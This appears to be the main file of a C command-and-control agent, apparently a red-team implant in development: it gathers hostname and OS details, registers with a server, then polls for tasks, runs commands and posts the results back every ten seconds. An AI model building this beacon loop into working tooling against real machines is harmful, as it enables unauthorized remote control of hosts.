#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    struct strings_array sa = { NULL, NULL, 0, 1, 0, NULL};
    struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}};
 
    bool host_info_gathered = false;
    while(!host_info_gathered) {
        if(get_host_info(&agent)) {
            puts("Host info gathered\n");
            host_info_gathered = true;
            printf("Hostname in main: %s\n", agent.hostname);
            printf("Agent os_type in main: %s\n", agent.os_version);
            printf("Agent os_version in main: %s\n", agent.os_version);
            break;
        } else {
            puts("Unable to gather host info\n");
            continue;
        }
    }

    bool registered = false;
    while(!registered) {
        if(reg(&agent, &sa)) {
            puts("Registered\n");
            registered = true;
	        printf("The data returning from agent registration main is %s\n\n", sa.response);
        // WILL NEED TO FREE sa.response and memset for each time I want to reuse!!
            continue;
        } else {
            puts("Not Registered, trying again\n");
            sleep(5);
            break;
        }

    }
    puts("Made it out of reg\n");
    printf("UUID in main is %s", agent.uuid);

    while(true) {
        puts("Checking tasks\n");
        // Check tasks will eventually return an array of strings.
        // The number of elements in that array will dictate how.
        // Many tasks there were and how many times execute_tasks
        // will be called.
        check_tasks(&agent, &sa);

        // Eventually check_tasks will return the task type and
        // specific task. An if block will be added here to
        // check if task type is cmd, if so, run the cmd commands.
        if(can_run_cmd("ip")) {
            puts("Command exists\n");
            if(run_cmd(&sa)) {
                // printf("%s", sa.words);
                post_results(&sa);
            }

        } else {
            puts("Command does not exist\n");
            continue;


        }

        // remember to destroy sa.words at some point.
        sleep(10);
    }
        
}